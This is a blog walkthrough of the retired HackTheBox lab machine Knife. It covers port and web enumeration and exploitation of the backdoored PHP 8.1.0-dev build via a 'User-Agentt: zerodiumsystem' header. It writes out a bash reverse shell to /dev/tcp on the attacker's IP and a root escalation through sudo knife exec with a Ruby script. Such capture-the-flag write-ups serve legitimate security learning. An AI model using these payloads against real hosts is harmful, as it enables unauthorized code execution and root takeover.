---
layout: walkthrough
title: HackTheBox - Knife
date: 2021-08-01 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/knife.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Knife --`10.129.137.141`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Knife/Overview.png"  style="width: 50%" />
</p>

## Information Gathering

In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bash
vagrant@ko:~/Desktop/HackTheBox/Knife$ sudo nmap -sC -sV 10.129.137.141
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 10:16 EDT
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 10:16 (0:00:06 remaining)
Nmap scan report for 10.129.137.141
Host is up (0.17s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.12 seconds

```

</details>


From the output shown above, we can see that the machine is a Linux machine. As this is a Linux machine and it only has 2 open ports, I started by navigating to the web application. 

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Knife/img1.png"  style="width: 80%" />
</p>

The links didn't redirect anywhere and the source code didn't seem to contain any useful information. At this point, I decided to start by performing some additional web enumeration. The output of the Gobuster and ffuf scans are provided below:

<details>

```bash
vagrant@ko:~/Desktop/HackTheBox/Knife$ gobuster dir -u http://knife.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://knife.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/05/24 10:19:34 Starting gobuster
===============================================================
/server-status (Status: 403)
[ERROR] 2021/05/24 10:25:55 [!] parse http://knife.htb/error_log: net/url: invalid control character in URL
===============================================================
2021/05/24 10:27:43 Finished
===============================================================
vagrant@ko:~/Desktop/HackTheBox/Knife$ 
```
```bash

vagrant@ko:~/Desktop/HackTheBox/Knife$ ffuf -c -u http://knife.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.knife.htb" -fs 5815

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://knife.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.knife.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 5815
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 233 req/sec :: Duration: [0:00:22] :: Errors: 0 ::
```
</details>


As shown above, there were no new directories or subdomains identified during the initial enumeration phase. I decided to take a step back and intercept the web application requests through the use of Burpsuite. The initial response to `/index.php` is provided below:

```html
HTTP/1.1 200 OK
Date: Mon, 24 May 2021 13:17:51 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Content-Length: 5815
Connection: close
Content-Type: text/html; charset=UTF-8
```

The captured response provided the only new piece of information that I had to go on, the application made use of `PHP\8.1.0-dev`.

> PHP verion 8.1.0-dev was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.

The vulnerable code was identified here: <https://news-web.php.net/php.internals/113838>. In order to exploit this on the host, I needed to abuse the `User-Agentt` header. 
I added in the header calling the `zerodiumsystem` command which ran the system command on the host:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Knife/img2.png"  style="width: 100%" />
</p>


Now that I had code execution, I used the following bash command to obtain a reverse shell on the host:

```bash
User-Agentt: zerodiumsystem("bash -c 'bash -i >& /dev/tcp/10.10.14.80/9001 0>&1'");

```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Knife/img3.png"  style="width: 80%" />
</p>


## Privilege Escalation using James
With access to the host, I started off by performing some basic enumeration in the form of `sudo -l`. The output of which is provided below:

```bash
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/
bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

As shown above, the user is able to run `/usr/bin/knife` with the `sudo` command. The excerpt below is taken from the following documentation: <https://docs-archive.chef.io/release/12-9/knife_using.html>.

> knife runs from a management workstation and sits in-between a Chef server and an organization’s infrastructure. knife interacts with a Chef server by using the same REST API that is used by a chef-client. Role-based authentication controls (RBAC) can be used to authorize changes when knife is run with the Chef server. 

This was confirmed by running `ls -la /usr/bin/knife` which pointed to a symlink for `knife` &rarr; `/opt/chef-workstation/bin/knife`. Since Chef was being run on Linux, it makes use of Ruby files. The help command within Knife pointed to the following executable command:

```bash
knife exec [SCRIPT] (options)
```

As shown above, I would be able to execute a Ruby script using Knife. I decided to create a Ruby reverse shell in a Ruby file which I would then execute using Knife. In order to create the file, I used the following command:


```bash
echo "system('/bin/bash')" > exploit.rb
```

With the file on the host, I simply needed to run the command with sudo in order to exploit Knife as shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Knife/img4.png"  style="width: 80%" />
</p>


That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.